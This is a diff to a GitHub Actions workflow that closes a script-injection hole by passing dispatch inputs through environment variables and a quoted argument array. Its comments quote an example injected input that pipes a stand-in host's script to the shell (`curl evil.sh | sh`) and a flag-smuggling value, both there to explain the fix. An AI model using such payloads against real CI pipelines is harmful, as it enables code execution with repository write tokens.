@@ -63,13 +63,38 @@ jobs:
       - run: npx playwright install --with-deps chromium
 
       - name: Archive the week
+        # The inputs reach the shell as environment variables and are never
+        # interpolated into the script itself. GitHub expands ${{ }} BEFORE
+        # the shell ever sees the line, so a dispatch input of
+        # `2026"; curl evil.sh | sh; "` was running as a command in a job
+        # holding `contents: write` and a persisted push token -- which is
+        # write access escalating itself into arbitrary execution.
+        #
+        # The argument array is the second half of the same fix. With a
+        # flat `$ARGS` string the quoting is gone by the time node is
+        # called, so a season of `2026 --force` still smuggles a flag past
+        # the `force` input. Quoted array elements survive word splitting,
+        # so every value arrives as exactly one argument.
+        env:
+          SEASON: ${{ inputs.season || '2026' }}
+          WEEK: ${{ inputs.week }}
+          FORCE: ${{ inputs.force }}
         run: |
-          ARGS="--season ${{ inputs.season || '2026' }}"
-          if [ -n "${{ inputs.week }}" ]; then ARGS="$ARGS --week ${{ inputs.week }}"; fi
-          if [ "${{ inputs.force }}" = "true" ]; then ARGS="$ARGS --force"; fi
-          node scripts/archive_week.mjs $ARGS
+          ARGS=(--season "$SEASON")
+          if [ -n "$WEEK" ]; then ARGS+=(--week "$WEEK"); fi
+          if [ "$FORCE" = "true" ]; then ARGS+=(--force); fi
+          node scripts/archive_week.mjs "${ARGS[@]}"
 
       - name: Commit if a week was archived
+        # Same reasoning as the archive step above, and this is the worse of
+        # the two sites: the season was interpolated straight into a
+        # `git commit -m "..."` line in the step that then runs `git push`
+        # with the persisted token. Neither scanner flagged this one -- the
+        # SAST rule matched only the first occurrence in the file -- so it
+        # was found by grepping every run: block for `${{`, which is the
+        # check worth repeating rather than trusting a clean report.
+        env:
+          SEASON: ${{ inputs.season || '2026' }}
         run: |
           git config user.name  "alpine-draft-bot"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
@@ -85,5 +110,5 @@ jobs:
           fi
 
           WEEK=$(git diff --staged --name-only | grep -oE 'week-[0-9]+' | head -1)
-          git commit -m "Archive ${{ inputs.season || '2026' }} $WEEK actuals"
+          git commit -m "Archive $SEASON $WEEK actuals"
           git push
